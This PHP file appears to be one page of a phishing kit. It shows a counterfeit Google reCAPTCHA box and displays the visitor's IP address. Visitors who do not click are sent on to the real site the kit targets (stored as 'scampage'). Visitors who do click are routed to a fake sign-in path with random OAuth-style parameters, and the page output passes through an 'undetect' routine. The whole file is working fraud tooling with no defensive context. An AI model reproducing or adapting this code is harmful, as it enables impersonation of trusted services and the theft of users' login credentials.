<?php
require __DIR__ . '/../function.php';
require $api->language();

$page = "Google CAPTCHA";
$api->check_cookie();
$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>'.$api->text_encode($lang['captcha']['title']).'</title>
    <style>
    body {
        font-family: Arial, sans-serif;
        background: #fff;
        margin: 0;
        padding: 0;
    }
    .main {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding-top: 100px;
        padding-left: 10px;
        padding-right: 10px;
    }
    #fake-captcha {
        width: 100%;
        max-width: 360px;
        padding: 16px;
        background: #fff;
        border: 1px solid #dcdcdc;
        border-radius: 5px;
        display: none;
        align-items: center;
        justify-content: space-between;
        box-shadow: 0 1px 2px rgba(238, 237, 237, 0.1);
        cursor: pointer;
    }
    #box {
        width: 20px;
        height: 20px;
        border: 1.5px solid #888;
        border-radius: 3px;
        box-sizing: border-box;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    #text {
        font-size: 14px;
        color: #222;
    }
    .left {
        display: flex;
        align-items: center;
        gap: 12px;
    }
    .right {
        text-align: center;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
    .right img {
        height: 20px;
        margin-bottom: 2px;
    }
    .right div {
        font-size: 10px;
        color: #888;
    }
    .lds-ring {
        display: inline-block;
        position: relative;
        width: 40px;
        height: 40px;
    }
    .lds-ring div {
        box-sizing: border-box;
        display: block;
        position: absolute;
        width: 32px;
        height: 32px;
        margin: 4px;
        border: 4px solid #4d90fe;
        border-radius: 50%;
        animation: spin 1.2s linear infinite;
        border-color: #4d90fe transparent transparent transparent;
    }
    .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
    .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
    .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    @media (max-width: 480px) {
        #fake-captcha {
            align-items: flex-start;
            gap: 10px;
        }
        .right {
            text-align: left;
        }
    }
    </style>
</head>
<body>
    <div class="main">
        <div class="lds-ring" id="spinner">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
        <div id="cf-challenge-running" style="margin-top: 20px; font-size: 15px; color: #555; text-align: center;">'.$api->text_encode($lang['captcha']['checking']).'</div>
        <div id="fake-captcha">
            <div class="left">
                <div id="box"></div>
                <div id="text">'.$api->text_encode($lang['captcha']['titlepage']).'</div>
            </div>
            <div class="right">
                <img src="'.$api->image_encode("assets/img/logo-google-captcha.png")['local'].'" alt="reCAPTCHA">
                <div>'.$api->text_encode($lang['captcha']['recaptcha']).'</div>
                <div>'.$api->text_encode($lang['captcha']['privacy']).'</div>
            </div>
        </div>
        <div style="font-size:13px; margin-top:30px; max-width: 600px; text-align: justify;">
            <b>'.$api->text_encode($lang['captcha']['aboutthepage']).'</b><br><br>
            '.$api->text_encode($lang['captcha']['notedthepage']).'
            <br><br>
            '.$api->text_encode($lang['captcha']['ipaddress']).' ' . $_SERVER["REMOTE_ADDR"] . '<br>
            '.$api->text_encode($lang['captcha']['date']).' ' . gmdate("Y-m-d H:i A") . '<br>
        </div>
    </div>
    <script>
    const captcha = document.getElementById("fake-captcha");
    const box = document.getElementById("box");
    const text = document.getElementById("text");
    let clicked = false;
    let timeoutRedirect;

    setTimeout(() => {
        var spinner = document.getElementById("spinner");
        if (spinner) { spinner.style.display = "none"; }
            captcha.style.display = "flex";
            var runningText = document.getElementById("cf-challenge-running");
            if (runningText) {
                runningText.textContent = ' . json_encode(html_entity_decode($api->text_encode($lang["captcha"]["verify_action"]))) . ';
            }
            
            timeoutRedirect = setTimeout(() => {
            if (!clicked) {
                window.location.href = "https://' . preg_replace("/^www\./", "", parse_url($api->scampage, PHP_URL_HOST)) . '";
            }
        }, 10000);
    }, 3000);
    
    captcha.addEventListener("click", () => {
        if (clicked) return;
        clicked = true;
        clearTimeout(timeoutRedirect);
        
        box.innerHTML = "<div style=\'width: 16px; height: 16px; border: 2px solid #ccc; border-top: 2px solid #4d90fe; border-radius: 50%; animation: spin 1s linear infinite;\'></div>";
        box.style.border = "none";
        text.textContent = ' . json_encode(html_entity_decode($api->text_encode($lang['captcha']['verifying']))) . ';
        
        setTimeout(() => {
            box.innerHTML = "✓";
            box.style.background = "#4d90fe";
            box.style.color = "white";
            box.style.border = "none";
            box.style.borderRadius = "3px";
            box.style.fontSize = "14px";
            box.style.fontWeight = "bold";
            text.textContent = ' . json_encode(html_entity_decode($api->text_encode($lang['captcha']['verified']))) . ';
            setTimeout(() => {
                const isMobile = /Android|iPhone/i.test(navigator.userAgent);
                const redirectBase = isMobile ? "/ap/mobile/signin" : "/ap/signin";
                const query = "?openid.pape.max_auth_age=0"
                    + "&client_id=' . substr($api->RANDOM(), 0, 10) . '-' . substr($api->RANDOM(), 0, 8) . '-' . substr($api->RANDOM(), 0, 12) . '"
                    + "&oauth_challenge=' . substr($api->RANDOM(), 0, 8) . '-' . substr($api->RANDOM(), 0, 6). '";
                window.location.href = redirectBase + query;
            }, 2000);
        }, 2000);
    });
    </script>
</body>
</html>';

$api->undetect($html);
?>